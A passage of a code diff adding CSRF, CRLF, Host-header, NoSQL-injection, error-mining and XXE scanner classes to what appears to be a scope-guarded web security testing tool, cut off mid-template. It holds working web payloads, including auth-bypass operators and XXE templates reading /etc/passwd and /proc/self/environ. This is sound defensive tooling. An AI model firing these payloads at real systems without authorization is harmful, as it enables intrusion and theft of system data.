+                    ):
+                        findings.append(self._build_finding(
+                            url, method, "csrf_token_removal",
+                            f"Request succeeded without CSRF token. "
+                            f"Baseline: {baseline_status} ({baseline_len}B). "
+                            f"Without token: {resp.status_code} ({len(resp.text)}B)",
+                            resp, baseline_status,
+                        ))
+                        continue  # Skip other tests for this endpoint
+                except Exception:
+                    pass
+
+            # --- Test 2: Modify CSRF token to random value ---
+            if token_found:
+                modified_body = self._modify_csrf_token(req_body)
+                try:
+                    resp = await self._client.request(
+                        method, url, headers=stripped_headers, cookies=req_cookies,
+                        content=modified_body,
+                    )
+                    requests_sent += 1
+                    if resp.status_code < 400 and self._is_state_change_response(
+                        resp.status_code, resp.text, baseline_status, baseline_body,
+                    ):
+                        findings.append(self._build_finding(
+                            url, method, "csrf_token_not_validated",
+                            f"Request succeeded with random CSRF token. "
+                            f"Baseline: {baseline_status}. "
+                            f"Random token: {resp.status_code} ({len(resp.text)}B)",
+                            resp, baseline_status,
+                        ))
+                        continue
+                except Exception:
+                    pass
+
+            # --- Test 3: Cross-origin Origin header ---
+            origin_headers = dict(req_headers)
+            origin_headers["Origin"] = "https://evil.com"
+            origin_headers["Referer"] = "https://evil.com/attack"
+            try:
+                resp = await self._client.request(
+                    method, url, headers=origin_headers, cookies=req_cookies,
+                    content=req_body if isinstance(req_body, str) else json.dumps(req_body),
+                )
+                requests_sent += 1
+                if resp.status_code < 400 and self._is_state_change_response(
+                    resp.status_code, resp.text, baseline_status, baseline_body,
+                ):
+                    findings.append(self._build_finding(
+                        url, method, "origin_not_validated",
+                        f"Request accepted with Origin: https://evil.com. "
+                        f"Status: {resp.status_code} (baseline: {baseline_status}). "
+                        f"No origin/referer validation — CSRF exploitable",
+                        resp, baseline_status,
+                    ))
+            except Exception:
+                pass
+
+            # --- Test 4: SameSite cookie check (from baseline response) ---
+            for cookie_header in baseline_resp.headers.get_list("set-cookie"):
+                cookie_lower = cookie_header.lower()
+                cookie_name = cookie_header.split("=")[0].strip() if "=" in cookie_header else "unknown"
+                if "samesite=none" in cookie_lower:
+                    cookie_issues.append({
+                        "cookie": cookie_name,
+                        "issue": "SameSite=None — cookies sent on cross-origin requests",
+                        "header": cookie_header[:200],
+                    })
+                elif "samesite" not in cookie_lower:
+                    cookie_issues.append({
+                        "cookie": cookie_name,
+                        "issue": "SameSite not set — defaults to Lax (may be exploitable via top-level GET)",
+                        "header": cookie_header[:200],
+                    })
+
+        # Deduplicate findings
+        seen: set[str] = set()
+        deduped: list[dict[str, Any]] = []
+        for f in findings:
+            key = f"{f['endpoint']}|{f['csrf_type']}"
+            if key not in seen:
+                seen.add(key)
+                deduped.append(f)
+
+        elapsed = round(time.monotonic() - start, 1)
+        logger.info("csrf_scan_complete",
+                     endpoints_tested=endpoints_tested,
+                     requests_sent=requests_sent,
+                     findings=len(deduped),
+                     elapsed=elapsed)
+        return {
+            "findings": deduped,
+            "cookie_issues": cookie_issues,
+            "endpoints_tested": endpoints_tested,
+            "requests_sent": requests_sent,
+            "elapsed_seconds": elapsed,
+        }
+
+    def _strip_csrf_token(self, body: Any) -> tuple[str, bool]:
+        """Remove CSRF token from request body. Returns (new_body, token_found)."""
+        if isinstance(body, dict):
+            new_body = {}
+            found = False
+            for k, v in body.items():
+                if k.lower() in _CSRF_TOKEN_NAMES:
+                    found = True
+                else:
+                    new_body[k] = v
+            return json.dumps(new_body), found
+
+        body_str = body if isinstance(body, str) else str(body)
+        found = False
+        # URL-encoded form body: key=value&key2=value2
+        if "=" in body_str and "&" in body_str or "=" in body_str:
+            parts = body_str.split("&")
+            filtered = []
+            for part in parts:
+                key = part.split("=")[0].strip() if "=" in part else part
+                if key.lower() in _CSRF_TOKEN_NAMES:
+                    found = True
+                else:
+                    filtered.append(part)
+            return "&".join(filtered), found
+
+        # JSON body
+        try:
+            data = json.loads(body_str)
+            if isinstance(data, dict):
+                new_data = {}
+                for k, v in data.items():
+                    if k.lower() in _CSRF_TOKEN_NAMES:
+                        found = True
+                    else:
+                        new_data[k] = v
+                return json.dumps(new_data), found
+        except (json.JSONDecodeError, TypeError):
+            pass
+
+        return body_str, found
+
+    def _modify_csrf_token(self, body: Any) -> str:
+        """Replace CSRF token value with a random string."""
+        import secrets as _secrets
+        random_token = _secrets.token_hex(16)
+
+        if isinstance(body, dict):
+            new_body = dict(body)
+            for k in new_body:
+                if k.lower() in _CSRF_TOKEN_NAMES:
+                    new_body[k] = random_token
+            return json.dumps(new_body)
+
+        body_str = body if isinstance(body, str) else str(body)
+        # URL-encoded
+        if "=" in body_str:
+            parts = body_str.split("&")
+            modified = []
+            for part in parts:
+                if "=" in part:
+                    key = part.split("=")[0].strip()
+                    if key.lower() in _CSRF_TOKEN_NAMES:
+                        modified.append(f"{key}={random_token}")
+                    else:
+                        modified.append(part)
+                else:
+                    modified.append(part)
+            return "&".join(modified)
+
+        # JSON body
+        try:
+            data = json.loads(body_str)
+            if isinstance(data, dict):
+                for k in data:
+                    if k.lower() in _CSRF_TOKEN_NAMES:
+                        data[k] = random_token
+                return json.dumps(data)
+        except (json.JSONDecodeError, TypeError):
+            pass
+        return body_str
+
+    @staticmethod
+    def _is_state_change_response(
+        test_status: int, test_body: str,
+        baseline_status: int, baseline_body: str,
+    ) -> bool:
+        """Check if the response indicates actual state change (not just 200 OK)."""
+        # Must be a success response
+        if test_status >= 400:
+            return False
+        # Similar status to baseline suggests the action went through
+        if abs(test_status - baseline_status) <= 1:
+            return True
+        # Redirect (302/303) often means action succeeded
+        if test_status in (301, 302, 303):
+            return True
+        return False
+
+    @staticmethod
+    def _build_finding(
+        url: str, method: str, csrf_type: str, detail: str,
+        resp: httpx.Response, baseline_status: int,
+    ) -> dict[str, Any]:
+        """Build a CSRF finding dict."""
+        resp_headers = dict(resp.headers)
+        return {
+            "endpoint": url,
+            "method": method,
+            "csrf_type": csrf_type,
+            "detail": detail,
+            "evidence_score": 4,
+            "status_code": resp.status_code,
+            "baseline_status": baseline_status,
+            "request_dump": f"{method} {url}\nOrigin: (modified per test)\n",
+            "response_dump": (
+                f"HTTP/1.1 {resp.status_code}\n"
+                + "".join(f"{k}: {v}\n" for k, v in list(resp_headers.items())[:10])
+                + f"\n{resp.text[:500]}"
+            ),
+        }
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── Error Response Miner ─────────────────────────────────────────────
+
+_ERROR_EXTRACTION_PATTERNS: dict[str, re.Pattern] = {
+    "file_path": re.compile(
+        r'(?:/home/\S+|/var/www/\S+|/app/\S+|/opt/\S+|/usr/\S+|/srv/\S+|'
+        r'C:\\(?:inetpub|Users|Windows)\\\S+|/tmp/\S+)',
+    ),
+    "framework_version": re.compile(
+        r'(?:Express[\s/]+[\d.]+|Django[\s/]+[\d.]+|Spring[\s/]+[\d.]+|'
+        r'Laravel[\s/]+[\d.]+|Next\.js[\s/]+[\d.]+|Flask[\s/]+[\d.]+|'
+        r'Rails[\s/]+[\d.]+|ASP\.NET[\s/]+[\d.]+|Kestrel[\s/]+[\d.]+|'
+        r'PHP[\s/]+[\d.]+|nginx[\s/]+[\d.]+|Apache[\s/]+[\d.]+)',
+        re.IGNORECASE,
+    ),
+    "database_type": re.compile(
+        r'(?:PostgreSQL|MySQL|MariaDB|MongoDB|ORA-\d+|SQLITE_|Microsoft SQL Server|'
+        r'redis|SQLSTATE\[\w+\]|pg_query|mysql_|mysqli_)',
+        re.IGNORECASE,
+    ),
+    "internal_url": re.compile(
+        r'https?://(?:internal[-.]|localhost|127\.0\.0\.\d+|10\.\d+\.\d+\.\d+|'
+        r'192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)\S*',
+    ),
+    "stack_trace": re.compile(
+        r'(?:at\s+\S+\s*\((?:/|\\)\S+:\d+:\d+\)|'
+        r'Traceback \(most recent call|'
+        r'System\.\w+Exception|'
+        r'java\.\w+\.(?:\w+\.)*\w+Exception|'
+        r'#\d+\s+/\S+\(\d+\))',
+    ),
+    "dependency_path": re.compile(
+        r'(?:node_modules/[\w@/.-]+|vendor/[\w/.-]+|site-packages/[\w/.-]+|'
+        r'gems/[\w/.-]+|\.jar|\.war)',
+    ),
+}
+
+
+class ErrorResponseMiner:
+    """Trigger and analyze error responses for information disclosure — zero LLM cost.
+
+    Sends intentionally malformed requests to discovered endpoints and
+    analyzes error responses for leaked information (file paths, versions,
+    stack traces, internal URLs, DB types).
+    """
+
+    def __init__(self, scope_guard: ActiveScopeGuard | None, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        self._timeout = timeout
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            timeout=timeout, verify=False, follow_redirects=True, **proxy_kwargs,
+        )
+
+    async def scan(
+        self,
+        base_url: str,
+        endpoints: dict[str, Any] | None = None,
+    ) -> dict[str, Any]:
+        """Scan endpoints by triggering errors and extracting leaked info."""
+        if self._scope_guard:
+            self._scope_guard.validate_url(base_url)
+
+        start = time.monotonic()
+        findings: list[dict[str, Any]] = []
+        endpoints_tested = 0
+        requests_sent = 0
+
+        # Build target list from endpoints or just use base_url
+        targets: list[str] = []
+        if endpoints and isinstance(endpoints, dict):
+            for path in list(endpoints.keys())[:15]:
+                if path.startswith("http"):
+                    targets.append(path)
+                else:
+                    targets.append(base_url.rstrip("/") + "/" + path.lstrip("/"))
+        if not targets:
+            targets = [base_url]
+
+        payloads = self._get_payloads()
+
+        for target_url in targets:
+            if self._scope_guard:
+                try:
+                    self._scope_guard.validate_url(target_url)
+                except Exception:
+                    continue
+
+            endpoints_tested += 1
+            endpoint_disclosures: dict[str, set[str]] = {}
+
+            for payload_name, send_fn in payloads:
+                try:
+                    resp = await send_fn(target_url)
+                    requests_sent += 1
+                except Exception:
+                    continue
+
+                if resp.status_code < 400:
+                    continue  # We want error responses
+
+                body = resp.text[:5000]
+                extracted = self._extract_disclosures(body)
+                if extracted:
+                    for category, values in extracted.items():
+                        if category not in endpoint_disclosures:
+                            endpoint_disclosures[category] = set()
+                        endpoint_disclosures[category].update(values)
+
+            # Only report if we found actual leaked data
+            if endpoint_disclosures:
+                detail_parts = []
+                for cat, vals in endpoint_disclosures.items():
+                    detail_parts.append(f"{cat}: {', '.join(list(vals)[:5])}")
+                findings.append({
+                    "endpoint": target_url,
+                    "disclosures": {k: list(v)[:5] for k, v in endpoint_disclosures.items()},
+                    "detail": "; ".join(detail_parts),
+                    "evidence_score": 4,
+                    "categories_found": list(endpoint_disclosures.keys()),
+                })
+
+        elapsed = round(time.monotonic() - start, 1)
+        logger.info("error_response_scan_complete",
+                     endpoints_tested=endpoints_tested,
+                     requests_sent=requests_sent,
+                     findings=len(findings),
+                     elapsed=elapsed)
+        return {
+            "findings": findings,
+            "endpoints_tested": endpoints_tested,
+            "requests_sent": requests_sent,
+            "elapsed_seconds": elapsed,
+        }
+
+    def _get_payloads(self) -> list[tuple[str, Any]]:
+        """Return list of (name, async_send_fn) payloads."""
+        async def invalid_content_type(url: str) -> httpx.Response:
+            return await self._client.post(
+                url, content="<xml>test</xml>",
+                headers={"Content-Type": "application/xml"},
+            )
+
+        async def oversized_input(url: str) -> httpx.Response:
+            return await self._client.post(
+                url, content=json.dumps({"input": "A" * 10000}),
+                headers={"Content-Type": "application/json"},
+            )
+
+        async def type_confusion(url: str) -> httpx.Response:
+            return await self._client.post(
+                url, content=json.dumps({"id": [1, 2, 3], "name": {"nested": True}}),
+                headers={"Content-Type": "application/json"},
+            )
+
+        async def empty_body(url: str) -> httpx.Response:
+            return await self._client.post(
+                url, content="",
+                headers={"Content-Type": "application/json"},
+            )
+
+        async def invalid_json(url: str) -> httpx.Response:
+            return await self._client.post(
+                url, content="{invalid json",
+                headers={"Content-Type": "application/json"},
+            )
+
+        async def sql_char(url: str) -> httpx.Response:
+            return await self._client.get(url, params={"id": "'"})
+
+        return [
+            ("invalid_content_type", invalid_content_type),
+            ("oversized_input", oversized_input),
+            ("type_confusion", type_confusion),
+            ("empty_body", empty_body),
+            ("invalid_json", invalid_json),
+            ("sql_char_in_param", sql_char),
+        ]
+
+    @staticmethod
+    def _extract_disclosures(body: str) -> dict[str, list[str]]:
+        """Extract leaked information from error response body."""
+        results: dict[str, list[str]] = {}
+        for category, pattern in _ERROR_EXTRACTION_PATTERNS.items():
+            matches = pattern.findall(body)
+            if matches:
+                # Deduplicate and limit
+                unique = list(dict.fromkeys(m.strip() for m in matches))[:5]
+                results[category] = unique
+        return results
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── CRLF Injection Scanner ──────────────────────────────────────────
+
+
+class CRLFScanner:
+    """Inject CRLF sequences in URL parameters and check for header injection.
+
+    Zero LLM cost. Evidence: response header ``X-Injected: true`` present =
+    definitive proof (evidence_score 5). Zero false-positive risk.
+    """
+
+    _PAYLOADS = [
+        "%0d%0aX-Injected:%20true",            # Standard URL-encoded
+        "%0D%0AX-Injected:%20true",            # Uppercase
+        "%0d%0aSet-Cookie:%20evil=1",           # Cookie injection
+        "%E5%98%8A%E5%98%8DX-Injected: true",  # Unicode CRLF (UTF-8 CR/LF)
+        "%%0d%%0aX-Injected:%20true",           # Double-encoded
+    ]
+
+    def __init__(
+        self,
+        scope_guard: ActiveScopeGuard | None,
+        timeout: int = 10,
+        socks_proxy: str | None = None,
+    ):
+        self._scope_guard = scope_guard
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            timeout=timeout, verify=False, follow_redirects=False,
+            **proxy_kwargs,
+        )
+
+    async def scan(
+        self,
+        base_url: str,
+        endpoints: dict[str, Any] | None = None,
+    ) -> dict[str, Any]:
+        """Scan endpoints for CRLF injection via URL parameters.
+
+        Returns:
+            {findings, endpoints_tested, requests_sent, elapsed_seconds}
+        """
+        if self._scope_guard:
+            self._scope_guard.validate_url(base_url)
+
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+
+        start = time.monotonic()
+        findings: list[dict[str, Any]] = []
+        endpoints_tested = 0
+        requests_sent = 0
+        seen: set[str] = set()  # dedup (endpoint, param)
+
+        # Collect testable URLs with query params
+        test_urls: list[str] = []
+        if endpoints:
+            for url in list(endpoints.keys())[:15]:
+                parsed = urlparse(url)
+                if parsed.query:
+                    test_urls.append(url)
+                else:
+                    # Also test redirect-like params on param-less endpoints
+                    for rp in ("url", "redirect", "next"):
+                        test_urls.append(f"{url}?{rp}=test")
+        if not test_urls:
+            # Fallback: test base_url with common params
+            for rp in ("url", "redirect", "next", "callback"):
+                test_urls.append(f"{base_url}?{rp}=test")
+
+        for url in test_urls[:15]:
+            parsed = urlparse(url)
+            qs = parse_qs(parsed.query, keep_blank_values=True)
+            if not qs:
+                continue
+            endpoints_tested += 1
+
+            for param_name in list(qs.keys())[:5]:
+                dedup_key = f"{parsed.path}:{param_name}"
+                if dedup_key in seen:
+                    continue
+                seen.add(dedup_key)
+
+                for payload in self._PAYLOADS:
+                    new_qs = dict(qs)
+                    new_qs[param_name] = [f"test{payload}"]
+                    new_query = urlencode(new_qs, doseq=True)
+                    target_url = urlunparse(parsed._replace(query=new_query))
+
+                    try:
+                        await asyncio.sleep(0.1)
+                        resp = await self._client.get(target_url)
+                        requests_sent += 1
+                    except Exception:
+                        requests_sent += 1
+                        continue
+
+                    # Check for injected header
+                    injected = False
+                    inject_detail = ""
+                    if "x-injected" in {k.lower() for k in resp.headers.keys()}:
+                        injected = True
+                        inject_detail = "X-Injected header found in response"
+                    elif "evil" in resp.headers.get("set-cookie", ""):
+                        injected = True
+                        inject_detail = "Set-Cookie: evil=1 injected"
+
+                    if injected:
+                        req_dump = f"GET {target_url}\nHost: {parsed.hostname}"
+                        resp_dump = f"HTTP {resp.status_code}\n"
+                        resp_dump += "\n".join(
+                            f"{k}: {v}" for k, v in list(resp.headers.items())[:15]
+                        )
+                        findings.append({
+                            "endpoint": url.split("?")[0],
+                            "parameter": param_name,
+                            "payload": payload,
+                            "detail": inject_detail,
+                            "evidence_score": 5,
+                            "status_code": resp.status_code,
+                            "request_dump": req_dump,
+                            "response_dump": resp_dump,
+                        })
+                        break  # One finding per param is enough
+
+        elapsed = round(time.monotonic() - start, 1)
+        logger.info("crlf_scan_complete",
+                     endpoints_tested=endpoints_tested,
+                     requests_sent=requests_sent,
+                     findings=len(findings),
+                     elapsed=elapsed)
+        return {
+            "findings": findings,
+            "endpoints_tested": endpoints_tested,
+            "requests_sent": requests_sent,
+            "elapsed_seconds": elapsed,
+        }
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── Host Header Injection Scanner ────────────────────────────────────
+
+
+class HostHeaderScanner:
+    """Test Host header and X-Forwarded-Host reflection on all endpoints.
+
+    Zero LLM cost. Evidence: ``evil.burpcollaborator.net`` appears in response
+    body or ``Location`` header = confirmed reflection (evidence_score 4).
+    """
+
+    _EVIL_HOST = "evil.burpcollaborator.net"
+
+    # Headers to test
+    _HEADER_TESTS = [
+        ("Host", _EVIL_HOST),
+        ("X-Forwarded-Host", _EVIL_HOST),
+        ("X-Forwarded-Server", _EVIL_HOST),
+        ("X-Original-URL", f"https://{_EVIL_HOST}/"),
+    ]
+
+    # Endpoints most likely to reflect Host header (password reset, login, etc.)
+    _PRIORITY_KEYWORDS = frozenset({
+        "reset", "password", "forgot", "login", "signin", "register",
+        "signup", "redirect", "callback", "confirm", "verify", "invite",
+        "email", "activate", "auth", "oauth", "sso",
+    })
+
+    def __init__(
+        self,
+        scope_guard: ActiveScopeGuard | None,
+        timeout: int = 10,
+        socks_proxy: str | None = None,
+    ):
+        self._scope_guard = scope_guard
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            timeout=timeout, verify=False, follow_redirects=False,
+            **proxy_kwargs,
+        )
+
+    async def scan(
+        self,
+        base_url: str,
+        endpoints: dict[str, Any] | None = None,
+    ) -> dict[str, Any]:
+        """Scan endpoints for Host header injection / reflection.
+
+        Returns:
+            {findings, endpoints_tested, requests_sent, elapsed_seconds}
+        """
+        if self._scope_guard:
+            self._scope_guard.validate_url(base_url)
+
+        from urllib.parse import urlparse
+
+        start = time.monotonic()
+        findings: list[dict[str, Any]] = []
+        endpoints_tested = 0
+        requests_sent = 0
+        seen: set[str] = set()  # dedup by endpoint path
+
+        # Build ordered endpoint list: priority endpoints first
+        test_urls: list[str] = []
+        other_urls: list[str] = []
+        if endpoints:
+            for url in endpoints:
+                path_lower = urlparse(url).path.lower()
+                if any(kw in path_lower for kw in self._PRIORITY_KEYWORDS):
+                    test_urls.append(url)
+                else:
+                    other_urls.append(url)
+        test_urls.extend(other_urls)
+        if not test_urls:
+            test_urls = [base_url]
+
+        for url in test_urls[:20]:
+            parsed = urlparse(url)
+            path_key = parsed.path or "/"
+            if path_key in seen:
+                continue
+            seen.add(path_key)
+            endpoints_tested += 1
+
+            original_host = parsed.hostname or ""
+
+            for header_name, header_value in self._HEADER_TESTS:
+                try:
+                    await asyncio.sleep(0.1)
+                    headers = {}
+                    if header_name == "Host":
+                        headers["Host"] = header_value
+                    else:
+                        headers[header_name] = header_value
+                    resp = await self._client.get(url, headers=headers)
+                    requests_sent += 1
+                except Exception:
+                    requests_sent += 1
+                    continue
+
+                # Check for reflection in body or Location header
+                reflected_in_body = self._EVIL_HOST in (resp.text or "")
+                location = resp.headers.get("location", "")
+                reflected_in_location = self._EVIL_HOST in location
+
+                # Exclude false positives: error messages about unrecognized host
+                if reflected_in_body and not reflected_in_location:
+                    body_lower = resp.text.lower()
+                    if any(phrase in body_lower for phrase in (
+                        "no such host", "unknown host", "not found",
+                        "server not found", "does not exist",
+                    )):
+                        continue
+
+                if reflected_in_body or reflected_in_location:
+                    where = []
+                    if reflected_in_body:
+                        where.append("response body")
+                    if reflected_in_location:
+                        where.append(f"Location header ({location[:200]})")
+
+                    req_dump = (
+                        f"GET {parsed.path or '/'} HTTP/1.1\n"
+                        f"Host: {original_host}\n"
+                        f"{header_name}: {header_value}"
+                    )
+                    resp_headers = "\n".join(
+                        f"{k}: {v}" for k, v in list(resp.headers.items())[:15]
+                    )
+                    resp_dump = f"HTTP {resp.status_code}\n{resp_headers}"
+                    if reflected_in_body:
+                        idx = resp.text.find(self._EVIL_HOST)
+                        snippet_start = max(0, idx - 100)
+                        snippet_end = min(len(resp.text), idx + 200)
+                        resp_dump += f"\n\n...{resp.text[snippet_start:snippet_end]}..."
+
+                    findings.append({
+                        "endpoint": url,
+                        "header_tested": header_name,
+                        "reflected_in": ", ".join(where),
+                        "detail": (
+                            f"{header_name}: {header_value} reflected in "
+                            f"{', '.join(where)} on {parsed.path or '/'}"
+                        ),
+                        "evidence_score": 4,
+                        "status_code": resp.status_code,
+                        "request_dump": req_dump,
+                        "response_dump": resp_dump,
+                    })
+                    break  # One finding per endpoint is enough
+
+        elapsed = round(time.monotonic() - start, 1)
+        logger.info("host_header_scan_complete",
+                     endpoints_tested=endpoints_tested,
+                     requests_sent=requests_sent,
+                     findings=len(findings),
+                     elapsed=elapsed)
+        return {
+            "findings": findings,
+            "endpoints_tested": endpoints_tested,
+            "requests_sent": requests_sent,
+            "elapsed_seconds": elapsed,
+        }
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── NoSQL Injection Scanner ──────────────────────────────────────────
+
+
+class NoSQLInjectionScanner:
+    """Detect NoSQL injection (MongoDB-style) — zero LLM cost.
+
+    Tests JSON body payloads ($ne, $gt, $regex, etc.) and query-string
+    operator injection ([$ne]=, [$gt]=, etc.).  Compares response status
+    and length against a clean baseline to identify auth bypass, data
+    extraction, or blind acceptance anomalies.
+    """
+
+    _JSON_PAYLOADS: list[tuple[str, Any]] = [
+        ("$ne", {"$ne": ""}),
+        ("$gt", {"$gt": ""}),
+        ("$regex", {"$regex": ".*"}),
+        ("$where", {"$where": "1==1"}),
+        ("$exists", {"$exists": True}),
+        ("$ne_null", {"$ne": None}),
+        ("$in", {"$in": ["admin", "root", "test"]}),
+    ]
+
+    _QS_PAYLOADS: list[tuple[str, str]] = [
+        ("[$ne]", "[$ne]="),
+        ("[$gt]", "[$gt]="),
+        ("[$regex]", "[$regex]=.*"),
+        ("[$exists]", "[$exists]=true"),
+        ("[$in][]", "[$in][]=admin"),
+        ("[$nin][]", "[$nin][]=x"),
+        ("[$where]", "[$where]=1==1"),
+    ]
+
+    _MAX_REQUESTS = 120
+    _MAX_ENDPOINTS = 15
+    _RATE_LIMIT = 0.1
+
+    def __init__(self, scope_guard: ActiveScopeGuard, timeout: int = 10,
+                 socks_proxy: str | None = None):
+        self._scope_guard = scope_guard
+        proxy_kwargs: dict[str, Any] = {}
+        if socks_proxy:
+            proxy_kwargs["proxy"] = socks_proxy
+        self._client = httpx.AsyncClient(
+            timeout=timeout, verify=False, follow_redirects=False,
+            **proxy_kwargs,
+        )
+        self._requests_sent = 0
+
+    async def scan(
+        self,
+        base_url: str,
+        endpoints: dict[str, dict[str, Any]] | None = None,
+        proxy_traffic: list[dict[str, Any]] | None = None,
+    ) -> dict[str, Any]:
+        start = time.monotonic()
+        findings: list[dict[str, Any]] = []
+        endpoints_tested = 0
+
+        # Collect testable endpoints (those with params or JSON body)
+        targets: list[tuple[str, str, dict]] = []  # (url, method, params)
+        if endpoints:
+            for url, meta in endpoints.items():
+                if not self._scope_guard.is_in_scope(url):
+                    continue
+                params = meta.get("params") or {}
+                method = (meta.get("method") or "GET").upper()
+                if params or method in ("POST", "PUT", "PATCH"):
+                    targets.append((url, method, params))
+        if proxy_traffic:
+            seen = {t[0] for t in targets}
+            for entry in proxy_traffic:
+                url = entry.get("url", "")
+                if url in seen or not self._scope_guard.is_in_scope(url):
+                    continue
+                method = (entry.get("method") or "GET").upper()
+                params = entry.get("query_params") or {}
+                if params or method in ("POST", "PUT", "PATCH"):
+                    targets.append((url, method, params))
+                    seen.add(url)
+
+        targets = targets[: self._MAX_ENDPOINTS]
+
+        for url, method, params in targets:
+            if self._requests_sent >= self._MAX_REQUESTS:
+                break
+            ep_findings = await self._test_endpoint(url, method, params)
+            endpoints_tested += 1
+            findings.extend(ep_findings)
+
+        elapsed = round(time.monotonic() - start, 1)
+        logger.info("nosqli_scan_complete", endpoints_tested=endpoints_tested,
+                     requests_sent=self._requests_sent, findings=len(findings),
+                     elapsed=elapsed)
+        return {
+            "findings": findings,
+            "endpoints_tested": endpoints_tested,
+            "requests_sent": self._requests_sent,
+            "elapsed_seconds": elapsed,
+        }
+
+    async def _test_endpoint(
+        self, url: str, method: str, params: dict,
+    ) -> list[dict[str, Any]]:
+        findings: list[dict[str, Any]] = []
+
+        # Baseline request
+        baseline = await self._send(url, method, params)
+        if baseline is None:
+            return findings
+
+        b_status, b_len, _, _ = baseline
+
+        # JSON body injection (POST/PUT/PATCH)
+        if method in ("POST", "PUT", "PATCH"):
+            body = dict(params) if params else {"username": "test", "password": "test"}
+            for param in list(body.keys())[:3]:
+                for payload_name, payload_val in self._JSON_PAYLOADS:
+                    if self._requests_sent >= self._MAX_REQUESTS:
+                        return findings
+                    injected = dict(body)
+                    injected[param] = payload_val
+                    result = await self._send_json(url, method, injected)
+                    if result is None:
+                        continue
+                    t_status, t_len, req_dump, resp_dump = result
+                    finding = self._detect_nosqli(
+                        b_status, b_len, t_status, t_len,
+                        url, param, f"json_{payload_name}", str(payload_val),
+                        req_dump, resp_dump,
+                    )
+                    if finding:
+                        findings.append(finding)
+                    await asyncio.sleep(self._RATE_LIMIT)
+
+        # Query string injection
+        for param in list(params.keys())[:5]:
+            for payload_name, payload_suffix in self._QS_PAYLOADS:
+                if self._requests_sent >= self._MAX_REQUESTS:
+                    return findings
+                injected = dict(params)
+                injected[f"{param}{payload_suffix}"] = ""
+                del injected[param]  # Replace original with injected
+                result = await self._send(url, "GET", injected)
+                if result is None:
+                    continue
+                t_status, t_len, req_dump, resp_dump = result
+                finding = self._detect_nosqli(
+                    b_status, b_len, t_status, t_len,
+                    url, param, f"qs_{payload_name}", payload_suffix,
+                    req_dump, resp_dump,
+                )
+                if finding:
+                    findings.append(finding)
+                await asyncio.sleep(self._RATE_LIMIT)
+
+        return findings
+
+    def _detect_nosqli(
+        self, b_status: int, b_len: int, t_status: int, t_len: int,
+        url: str, param: str, payload_type: str, payload: str,
+        req_dump: str, resp_dump: str,
+    ) -> dict[str, Any] | None:
+        score = 0
+        detail_parts: list[str] = []
+
+        # Auth bypass: 401/403 → 200
+        if b_status in (401, 403) and t_status == 200:
+            score = 5
+            detail_parts.append(f"Auth bypass: {b_status}→{t_status}")
+        # Data extraction: response >30% larger
+        elif b_len > 0 and t_len > b_len * 1.3:
+            score = 5
+            detail_parts.append(
+                f"Data extraction: response {t_len}B vs baseline {b_len}B "
+                f"(+{round((t_len - b_len) / b_len * 100)}%)"
+            )
+        # Blind acceptance: different status
+        elif b_status != t_status and t_status < 500:
+            score = 4
+            detail_parts.append(f"Status diff: {b_status}→{t_status}")
+
+        if score == 0:
+            return None
+
+        return {
+            "endpoint": url,
+            "parameter": param,
+            "payload_type": payload_type,
+            "payload": payload,
+            "detail": f"NoSQL injection via {payload_type} on '{param}': {'; '.join(detail_parts)}",
+            "evidence_score": score,
+            "status_code": t_status,
+            "baseline_status": b_status,
+            "request_dump": req_dump,
+            "response_dump": resp_dump,
+        }
+
+    async def _send(
+        self, url: str, method: str, params: dict,
+    ) -> tuple[int, int, str, str] | None:
+        try:
+            self._requests_sent += 1
+            resp = await self._client.request(method, url, params=params)
+            req_dump = f"{method} {url}?{'&'.join(f'{k}={v}' for k, v in params.items())}"
+            headers = "\n".join(f"{k}: {v}" for k, v in list(resp.headers.items())[:10])
+            resp_dump = f"HTTP {resp.status_code}\n{headers}\n\n{resp.text[:500]}"
+            return resp.status_code, len(resp.text), req_dump, resp_dump
+        except Exception:
+            return None
+
+    async def _send_json(
+        self, url: str, method: str, body: dict,
+    ) -> tuple[int, int, str, str] | None:
+        try:
+            self._requests_sent += 1
+            resp = await self._client.request(method, url, json=body)
+            req_dump = f"{method} {url}\nContent-Type: application/json\n\n{json.dumps(body)[:300]}"
+            headers = "\n".join(f"{k}: {v}" for k, v in list(resp.headers.items())[:10])
+            resp_dump = f"HTTP {resp.status_code}\n{headers}\n\n{resp.text[:500]}"
+            return resp.status_code, len(resp.text), req_dump, resp_dump
+        except Exception:
+            return None
+
+    async def close(self):
+        await self._client.aclose()
+
+
+# ── XXE Scanner ──────────────────────────────────────────────────────
+
+
+class XXEScanner:
+    """Detect XML External Entity (XXE) injection — zero LLM cost.
+
+    Phase 1: Discover endpoints that accept XML (probe with benign XML).
+    Phase 2: Test with XXE payloads (file read, parameter entity, XInclude, SVG).
+    """
+
+    _FILE_PAYLOADS: list[tuple[str, str | None]] = [
+        ("file:///etc/passwd", r"root:x:0:0:"),
+        ("file:///etc/hostname", None),
+        ("file:///proc/self/environ", r"PATH=|HOME="),
+        ("file:///FLAG", None),
+    ]
+
+    _XXE_TEMPLATES: dict[str, str] = {
+        "basic": (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{uri}">]>'
+            '<root><data>&xxe;</data></root>'
+        ),
+        "parameter": (
+            '<?xml version="1.0" encoding="UTF-8"?>'
+            '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{uri}">%xxe;]>'
+            '<root><data>test</data></root>'
+        ),
+        "xinclude": (
+            '<root xmlns:xi="http://www.w3.org/2001/XInclude">'
+            '<xi:include href="{uri}" parse="text"/></root>'
+        ),
+        "svg": (
+            '<?xml version="1.0" encoding="UTF-8"?>'
